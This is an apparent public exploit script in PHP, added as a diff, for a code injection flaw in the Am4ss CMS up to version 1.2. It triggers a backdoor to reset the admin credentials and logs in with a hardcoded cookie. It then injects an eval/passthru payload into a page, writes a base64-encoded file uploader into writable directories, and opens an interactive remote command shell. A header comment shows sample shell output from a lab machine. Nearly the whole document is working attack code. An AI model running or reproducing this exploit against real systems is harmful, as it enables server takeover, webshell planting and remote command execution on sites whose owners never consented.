@@ -1,0 +1,172 @@
+<?
+/*
++ Title : Am4ss <= 1.2 , PHP Code Injection
+| Download : am4ss.com
+| Tested on: Windows xp sp3 , CentOs
+| Author : Faris , aka i-Hmx
+| n0p1337@gmail.com
++ sec4ever.com , 1337s.cc
+Time line :
+ > 10/2011 , Vulnerability discovered
+ > till now , i haven't reported the vendor , why!!!
+   The idiot backdoored it by himself + the official site is fucked up ;)
+ > 19/07/2012 , Public Disclosured
+ 
+C:\lab>php am4ss.php localhost /lab/am4ss/
++---------------------------------------+
+|      Am4SS , PHP Code Injection       |
+|         Exploited By i-Hmx            |
+|          n0p1337@gmail.com            |
+|       sec4ever.com , 1337s.cc         |
++---------------------------------------+
+| Testing Authentication
+| Injecting our Evil php code
+| Searching for Injected PageID
+     => 0
+     => 1
+     => 2
+     => 3
+     => 4
+     => 5
+| Injected ID is 5
+| I Have wrriten Tiny uploader at :
+   + localhost/lab/am4ss//am4ss_cache/fa.php
+   + localhost/lab/am4ss//templates/fa.php
+| sec4ever shell online ;)
+i-Hmx@localhost# net user
+User accounts for \\
+-------------------------------------------------------------------------------
+Administrator            ASPNET                   Guest
+HelpAssistant            IUSR_PHOENIX-XP          IWAM_PHOENIX-XP
+PhoeniX                  PhoeniX.Limited          SUPPORT_388945a0
+The command completed with one or more errors.
+ 
+i-Hmx@localhost# exit
+*/
+if(!$argv[2])
+{
+echo "\n+ usage : php ".$argv[0]." [Target without http://] /path/\nex : php ".$argv[0]." site.com /support/\n";
+exit();
+}
+session_start();
+echo "\n+---------------------------------------+\n";
+echo "|      Am4SS , PHP Code Injection       |\n";
+echo "|         Exploited By i-Hmx            |\n";
+echo "|          n0p1337@gmail.com            |\n";
+echo "|       sec4ever.com , 1337s.cc         |\n";
+echo "+---------------------------------------+\n";
+$host=$argv[1];
+$_SESSION['host']=$host;
+$path=$argv[2];
+$vic=$host.$path;
+function kastr($string, $start, $end){
+  $string = " ".$string;
+  $ini = strpos($string,$start);
+  if ($ini == 0) return "";
+  $ini += strlen($start);
+  $len = strpos($string,$end,$ini) - $ini;
+  return substr($string,$ini,$len);
+}
+function get($url,$post,$cookies){
+$curl=curl_init();
+curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($curl,CURLOPT_URL,"http://".$url);
+curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
+curl_setopt($curl,CURLOPT_COOKIE,$cookies);
+curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
+curl_setopt($curl,CURLOPT_TIMEOUT,20);
+$exec=curl_exec($curl);
+curl_close($curl);
+return $exec;
+}
+/*
+Enabling the Dirty Backdoor
+*/
+$ok=kastr($vic,"http://","//");
+if (!eregi($host,urlencode(get($vic."/libs/internals/core.assign_by_ref.php?password=ef211a58a6a04914923a7bf23a9a7f0c&username=%C7%E1%D4%D1%DE%C7%E6%ED&country=%C7%E1%E3%DB%D1%C8",'',''))))
+{
+die("+ Exploitation Failed :(");
+}
+/*
+authenticating using the updated admin data
+*/
+echo "| Testing Authentication\n";
+if(!eregi('<td class="tfoot" align="middle" colSpan="2">',get($vic."/admincp/settings.php","",'Am4sS_CPCHERKAOUI_UserEmail=alert@am4ss.com;Am4sS_CPCHERKAOUI_PassWord=ef211a58a6a04914923a7bf23a9a7f0c')))
+{
+/*
+login may failed due to bad connection , admincp path error , admin firewall .  .  . etc
+any way u can use the following data to login manually
+*/
+echo "| Authentication Failed\n| Try to login manually using :\n   + User : alert@am4ss.com\n   + Password : kawkawa\n   | auth cookies : \n   + Am4sS_CPCHERKAOUI_UserEmail : alert@am4ss.com\n   + Am4sS_CPCHERKAOUI_PassWord  : ef211a58a6a04914923a7bf23a9a7f0c \n+ Exiting \n";
+die();
+}
+/*
+Creating new page to inject our evil php code
+*/
+$facode='echo "<pre>Faris on the mic ;)<br>";@eval(base64_decode($_REQUEST[fa]));echo "faris>>>";passthru(base64_decode($_SERVER[HTTP_CMD]));echo "<<<faris";';
+echo "| Injecting our Evil php code\n";
+get($vic."/admincp/pages.php?do=add",'do=save&title=farsawy&codetype=2&code='.$facode.'','Am4sS_CPCHERKAOUI_UserEmail=alert@am4ss.com;Am4sS_CPCHERKAOUI_PassWord=ef211a58a6a04914923a7bf23a9a7f0c');
+echo "| Searching for Injected PageID\n";
+/*
+Trying to get the ijected pageid via testing 100 pages
+i don't think it will exceed 10 pages after all :)
+if this failed , retry exploitation and it will work as hell
+*/
+for($f=0;$f<100;$f++)
+{
+$mypage=get($vic."/pages.php?pageid=$f","","");
+echo "     => $f\n";
+ if(eregi(">>>",$mypage))
+ {
+ $_SESSION['id']=$f;
+ break;
+ }
+}
+$myid=$_SESSION['id'];
+echo "| Injected ID is $myid\n";
+/*
+Injecting tinni file uploader at the cache and the templates directories
+these usually chmoded to 777 by the admin
+*/
+get($vic."pages.php?pageid=$myid&fa=JGNvZGUgPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBTkNtVmphRzhnSnp4bWIzSnRJR0ZqZEdsdmJqMGlJaUJ0WlhSb2IyUTlJbkJ2YzNRaUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJRzVoYldVOUluVndiRzloWkdWeUlpQnBaRDBpZFhCc2IyRmtaWElpUGljN0RRcGxZMmh2SUNjOGFXNXdkWFFnZEhsd1pUMGlabWxzWlNJZ2JtRnRaVDBpWm1sc1pTSWdjMmw2WlQwaU5UQWlQanhwYm5CMWRDQnVZVzFsUFNKZmRYQnNJaUIwZVhCbFBTSnpkV0p0YVhRaUlHbGtQU0pmZFhCc0lpQjJZV3gxWlQwaVZYQnNiMkZrSWo0OEwyWnZjbTArSnpzTkNtbG1LQ0FrWDFCUFUxUmJKMTkxY0d3blhTQTlQU0FpVlhCc2IyRmtJaUFwSUhzTkNnbHBaaWhBWTI5d2VTZ2tYMFpKVEVWVFd5ZG1hV3hsSjExYkozUnRjRjl1WVcxbEoxMHNJQ1JmUmtsTVJWTmJKMlpwYkdVblhWc25ibUZ0WlNkZEtTa2dleUJsWTJodklDYzhZajVWY0d4dllXUWdVMVZMVTBWVElDRWhJVHd2WWo0OFluSStQR0p5UGljN0lIME5DZ2xsYkhObElIc2daV05vYnlBblBHSStWWEJzYjJGa0lFZEJSMEZNSUNFaElUd3ZZajQ4WW5JK1BHSnlQaWM3SUgwTkNuME5DajgrIik7CiRmID0gZm9wZW4oImFtNHNzX2NhY2hlL2ZhLnBocCIsInciKTsKJHQgPSBmb3BlbigidGVtcGxhdGVzL2ZhLnBocCIsInciKTsKZndyaXRlKCRmLCRjb2RlKTsKZndyaXRlKCR0LCRjb2RlKTs=","","");
+echo "| I Have wrriten Tiny uploader at :\n   + $vic/am4ss_cache/fa.php\n   + $vic/templates/fa.php\n";
+/*
+printing sec4ever1337s via passthru()
+to check if it's enabled or not
+*/
+if (!eregi("sec4ever1337s",get($vic."/pages.php?pageid=$f&fa=cGFzc3RocnUoJ2VjaG8gc2VjNGV2ZXIxMzM3cycpOw==","","")))
+{
+echo "| passthru is disabled \n";
+echo "| You can evaluate Your code at:\n    $vic/pages.php?pageid=$myid&fa=base64_encode(eval code)\n";
+exit('+ Exiting');
+}
+echo "| sec4ever shell online ;)\n";
+/*
+if passthru() is enabled , then get small command executer
+using Egix fsock method to send and retrieve data
+*/
+function http_send($host, $packet)
+{
+$sock = fsockopen($host, 80);
+fputs($sock, $packet);
+return stream_get_contents($sock);
+}
+$packet  = "GET /{$path}/pages.php?pageid=$myid HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+while(1)
+{
+print "\ni-Hmx@".$_SESSION['host']."# ";
+if (($fa = trim(fgets(STDIN))) == "exit") exit("\n+ Exiting");
+$response = http_send($host, sprintf($packet, base64_encode($fa)));
+$final=kastr($response,"faris>>>","<<<faris");
+echo $final;
+}
+/*
+woooooow , that really fucked my mind
+But it was funny :D
+Greets to all sec4ever members
+C u Guys in another Bomb ;)
+*/
+?>
